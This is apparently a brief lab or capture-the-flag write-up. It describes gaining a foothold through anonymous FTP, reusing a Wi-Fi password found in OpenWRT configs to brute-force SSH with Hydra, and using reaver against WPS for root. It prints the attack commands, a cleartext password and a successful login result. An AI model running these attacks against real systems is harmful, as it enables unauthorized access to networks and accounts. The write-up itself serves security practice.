In the initial nmap search I was able to find an open ftp port that I was able to login under the anonymous username without password.

From there I was able to `get` several SSID OpenWRT configuration files that got me the password `VeRyUniUqWiFIPasswrd1!` 

From there I used Hydra to brute force the user list found in the config files:

```
hydra -L usernames.txt -p 'VeRyUniUqWiFIPasswrd1!' 10.129.229.90 ssh
```

And received this result:

```
[22][ssh] host: 10.129.229.90   login: netadmin   password: VeRyUniUqWiFIPasswrd1!
```

So from the above we get user access to the attacking box, but we need to privilege escalate to get root access. Below are some commands to get information on wireless interfaces on our attacking boi:

```
$ ifconfig
$ systemctl status wpa_supplicant.service
$ systemctl status hostapd.service
$ iwconfig
$ iw dev
```

Finally we run `reaper`, which gets us our root pw:

```
reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1
```
